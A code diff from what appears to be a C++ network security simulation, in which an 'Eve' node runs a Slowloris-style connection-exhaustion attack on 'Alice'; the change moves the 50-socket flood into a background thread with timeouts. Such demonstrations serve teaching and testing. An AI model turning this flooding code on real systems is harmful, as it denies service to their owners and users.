@@ -135,27 +135,34 @@ int main(int argc, char* argv[]) {
                 send(to_alice, buffer, b, 0);
 
                 if (ddos_attack) {
+                    ddos_attack = false; // Only trigger the background attack once
                     std::cerr << "[Eve] DDoS: Launching Slowloris-style connection exhaustion...\n";
 
-                    const int attack_connections = 50;
+                    std::thread([alice_addr]() {
+                        const int attack_connections = 50;
 
-                    for (int i = 0; i < attack_connections; i++) {
-                        SOCKET spam_sock = socket(AF_INET, SOCK_STREAM, 0);
-                        if (spam_sock == INVALID_SOCKET) continue;
+                        for (int i = 0; i < attack_connections; i++) {
+                            SOCKET spam_sock = socket(AF_INET, SOCK_STREAM, 0);
+                            if (spam_sock == INVALID_SOCKET) continue;
 
-                        sockaddr_in target = alice_addr;
+                            // Set a short timeout for the socket so we don't wait forever on full Linux backlog
+                            struct timeval timeout;
+                            timeout.tv_sec = 1;
+                            timeout.tv_usec = 0;
+                            setsockopt(spam_sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
 
-                        if (connect(spam_sock, (struct sockaddr*)&target, sizeof(target)) == SOCKET_ERROR) {
-                            closesocket(spam_sock);
-                            continue;
+                            sockaddr_in target = alice_addr;
+
+                            if (connect(spam_sock, (struct sockaddr*)&target, sizeof(target)) != SOCKET_ERROR) {
+                                char partial = 0x01;
+                                send(spam_sock, &partial, 1, 0);
+                            } else {
+                                closesocket(spam_sock);
+                            }
+
+                            std::this_thread::sleep_for(std::chrono::milliseconds(50));
                         }
-
-                        char partial = 0x01;
-
-                        send(spam_sock, &partial, 1, 0);
-
-                        std::this_thread::sleep_for(std::chrono::milliseconds(50));
-                    }
+                    }).detach();
                 }
             }
         }
